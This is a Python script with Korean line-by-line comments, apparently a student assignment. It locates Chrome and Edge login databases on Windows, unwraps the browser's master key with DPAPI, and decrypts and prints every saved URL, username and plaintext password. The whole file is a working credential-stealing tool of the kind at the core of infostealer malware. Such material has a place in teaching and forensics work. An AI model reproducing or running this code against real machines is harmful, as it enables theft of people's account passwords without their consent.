import sqlite3
import os
import glob
import json
import base64
import shutil

try:
    import win32crypt
    from Crypto.Cipher import AES
except:
    pass

os_env = os.environ['USERPROFILE'] + os.sep

PATH = {
    'Chrome':        glob.glob(f'{os_env}/AppData/Local/Google/Chrome/User Data/*/Login Data'),
    'ChromeKeyPath': glob.glob(f'{os_env}/AppData/Local/Google/Chrome/User Data/Local State'),
    'Edge':          glob.glob(f'{os_env}/AppData/Local/Microsoft/Edge/User Data/*/Login Data'),
    'EdgeKeyPath':   glob.glob(f'{os_env}/AppData/Local/Microsoft/Edge/User Data/Local State')
}


def decrypt(encryptedValue, key=None):
    try:
        # for over 80 version chrome
        iv = encryptedValue[3:15] # 3번~14번 값을 이니셜 벡터로서 사용 
        payload = encryptedValue[15:] # 15번 이후부터가 암호화된 텍스트
        cipher = AES.new(key, AES.MODE_GCM, iv) # 위에서 받아온 key, mode는 GCM mode 사용, 이니셜 벡터는 길이 12짜리의 문자열 가져옴
        decrypted = cipher.decrypt(payload) # line 26의 암호화된 텍스트를 복호화함
        decrypted = decrypted[:-16].decode()  # remove suffix bytes / byte 형태를 문자열 형태로 디코팅하여 문자열 형태로 바꿔주는 작업
        return decrypted
    except: # try 구문에서 오류가 생길 때 이 except 구문 실행
        # chrome version under 80
        under_80_password = win32crypt.CryptUnprotectData(encryptedValue, None, None, None, 0)[1]
        return under_80_password.decode() # 80버전 이전에 저장되었던 password들을 복호화하여 반환


def get_aes_key(keyPath):
    with open(keyPath, 'rt', encoding='UTF8') as f: # 'rt': 텍스트(text) 형태로 읽겠다(read)는 뜻
        local_state = f.read()
        local_state = json.loads(local_state) # local_state를 jason 형태로 읽어옴
    aes_key = base64.b64decode(local_state['os_crypt']['encrypted_key']) # base64로 인코딩되어 있던 걸 디코딩해줌
    aes_key = aes_key[5:]  # removing DPAPI
    aes_key = win32crypt.CryptUnprotectData(aes_key, None, None, None, 0)[1] # win32crypt 라이브러리에서 CryptUnprotectData를 사용하여 DPAPI로 암호화된 데이터를 복호화해주는 역할을 함 / [1]은 복호화할 데이터의 값의 첫번째 값을 가지고 온다는 뜻
    
    return aes_key # 실제로 aes에 사용된 key 반환


def pwd_extraction(safeStorageKey, loginData): # line 47에서 반환된 key가 safeStorageKey라는 파라미터로 들어옴
    decrypted_list = []

    shutil.copy2(loginData, './login_vault.db') # loginData 경로에 있는 database를 현재 실행중인 폴더 './login_vault.db'에 복사하겠다는 뜻

    with sqlite3.connect('./login_vault.db') as database: # with 구문을 통해 열린 파일 or DB가 with 구문이 끝남과 동시에 닫히는 구문, sqlite3의 connect 함수를 사용하여 './login_vault.db'에 연결하고 database 변수에 저장
        cursor = database.cursor() # 위 database로 cursor를 옮김
        db_items = cursor.execute( # 아래에서 가져온 것들을 db_items 에 저장하겠다는 뜻
            'SELECT username_value, password_value, origin_url FROM logins' # username_value, password_value, origin_url 3개를 로그인 데이터 정보 테이블이 담긴 logins안으로부터 가져온다는 뜻
        )

    for username, encrypted_pass, url in db_items.fetchall(): # fetchall을 써서 login data라는 database 안에 저장되어 있는 것을 다 가져옴
        if encrypted_pass and len(username) > 0: # encrypted_pass나 username이 비어있지 않은 경우만 복호화 과정 진행
            decrypted_list.append({
                'origin_url': url,
                'username': username,
                'password': decrypt(encrypted_pass, safeStorageKey) # encrypted_pass라는 암호화된 패스워드와 line 50에서 파라미터로 받아왔던 safeStorageKey를 가지고 decrypt 함수로 복호화 진행
            })

    return decrypted_list


if __name__ == '__main__': # 가장 중요한 메인 함수 시작
    # color setting ANSI
    default = "\033[0m" # "\033[0m]" 문자열 다음부터 적용
    green = "\033[32m"
    yellow = "\033[33m"
    blue = "\033[34m"
    bold = "\033[1m"

    browser_type = 'Chrome' # line 16~21의 PATH dictionary 중 Chrome을 분석할 것이니 'Chrome'을 적어줌
    login_data = PATH.get(browser_type) # PATH dictionary에서 get으로 browser_type을 login_data로 가져옴, 즉 line 17이 가져와짐
    key_path = PATH.get(browser_type + 'KeyPath')[0] # PATH dictionary에서 get으로 browser_type + KeyPath를 key_path로 가져옴, 즉 line 18이 가져와짐 / [0]은 여러 local state 중 첫번째 거를 가져온다는 뜻

    for profile in login_data: 
        for i, info in enumerate(pwd_extraction(get_aes_key(key_path), f"{profile}")): # enumerate는 index(i)와 그 안의 값(info)을 가져올 수 있게 만들어주는 함수 / line 50에 있는 사용자 지정 함수 pwd_extraction 실행
            print(
                f"{green}[{(i + 1)}]{default}{bold} \n"
                f"URL:   {str(info['origin_url'])} \n"
                f"User:  {str(info['username'])} \n"
                f"Pwd:   {str(info['password'])} \n {default}"
            )

    print(f"{bold}{green}student_ID: {yellow}20182517{default}") # line 74~77에 설정한 컬러 코드를 적용한 모습
